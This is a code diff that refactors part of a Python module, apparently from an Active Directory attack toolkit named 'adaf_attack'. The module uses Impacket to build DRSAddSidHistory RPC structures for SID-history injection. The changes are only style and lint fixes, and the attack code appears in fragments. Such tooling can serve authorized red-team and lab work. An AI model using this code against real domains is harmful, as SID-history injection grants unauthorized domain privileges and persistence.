@@ -15,7 +15,7 @@ which is why this RPC path is the default injection method.
 
 from __future__ import annotations
 
-from typing import Any
+from typing import Any, ClassVar
 
 from adaf_attack.core.impacket_helper import require_impacket
 
@@ -35,7 +35,7 @@ def _structures() -> tuple[type[Any], type[Any]]:
     from impacket.dcerpc.v5.dtypes import DWORD, GUID, LPWSTR
     from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT, NDRUNION
 
-    class DRS_MSG_ADDSIDHISTORY_REQUEST_V1(NDRSTRUCT):  # type: ignore[misc]
+    class DrsMsgAddSidHistoryRequestV1(NDRSTRUCT):  # type: ignore[misc]
         structure = (
             ("SrcDomainNc", LPWSTR),
             ("DstPrincipal", LPWSTR),
@@ -45,16 +45,18 @@ def _structures() -> tuple[type[Any], type[Any]]:
             ("ExtraSid", NT4SID),
         )
 
-    class DRS_MSG_ADDSIDHISTORY_REQUEST(NDRUNION):  # type: ignore[misc]
-        commonHdr = (("tag", DWORD),)
-        union = {1: ("V1", DRS_MSG_ADDSIDHISTORY_REQUEST_V1)}
+    class DrsMsgAddSidHistoryRequest(NDRUNION):  # type: ignore[misc]
+        commonHdr = (("tag", DWORD),)  # noqa: N815  # Impacket NDR field name
+        union: ClassVar[dict[int, tuple[str, type[Any]]]] = {
+            1: ("V1", DrsMsgAddSidHistoryRequestV1)
+        }
 
     class DRSAddSidHistory(NDRCALL):  # type: ignore[misc]
         opnum = OPNUM_DRS_ADD_SID_HISTORY
         structure = (
             ("hDrs", DRS_HANDLE),
             ("dwInVersion", DWORD),
-            ("pmsgIn", DRS_MSG_ADDSIDHISTORY_REQUEST),
+            ("pmsgIn", DrsMsgAddSidHistoryRequest),
         )
 
     class DRSAddSidHistoryResponse(NDRCALL):  # type: ignore[misc]
@@ -132,7 +134,7 @@ def add_sid_history(
         else:
             payload["ok"] = True
         return payload
-    except Exception as exc:  # noqa: BLE001
+    except Exception as exc:
         text = str(exc).lower()
         payload["ok"] = False
         payload.setdefault("stage", "connect")
@@ -152,5 +154,5 @@ def add_sid_history(
                 unbind = DRSUnbind()
                 unbind["phDrs"] = handle
                 dce.request(unbind)
-            except Exception:  # noqa: BLE001,S110
+            except Exception:
                 pass
